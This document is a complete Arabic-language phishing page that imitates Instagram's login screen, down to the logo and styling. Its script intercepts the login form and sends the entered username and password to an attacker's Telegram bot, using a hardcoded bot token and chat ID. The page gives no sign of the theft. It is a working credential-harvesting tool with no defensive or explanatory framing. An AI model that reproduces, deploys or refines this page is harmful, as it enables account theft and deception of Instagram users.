<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        .login-container {
            background: white;
            padding: 20px;
            width: 350px;
            text-align: center;
            border: 1px solid #dbdbdb;
        }
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }
        .logo i {
            background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yB/r/E7m8ZCMOFDS.png');
            background-position: 0px -52px;
            background-size: auto;
            width: 175px;
            height: 51px;
            background-repeat: no-repeat;
            display: inline-block;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }
        .login-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #007acc;
        }
        .forgot {
            margin-top: 10px;
            font-size: 12px;
        }
    </style>
    <script>
        function sendToTelegram(event) {
            event.preventDefault();
            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            
            let botToken = '7807683290:AAHDyU3krnj-t8NlxPSjhVxesDPCyBoN-SI';
            let chatId = '8011712410';
            let message = `اسم المستخدم: ${username}%0Aكلمة المرور: ${password}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
                .then(response => response.json())
                .then(data => console.log(data))
                .catch(error => console.error('Error:', error));
        }
    </script>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <i aria-label="Instagram" role="img"></i>
        </div>
        <form onsubmit="sendToTelegram(event)">
            <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
        <div class="forgot"><a href="#">هل نسيت كلمة المرور؟</a></div>
    </div>
</body>
</html>
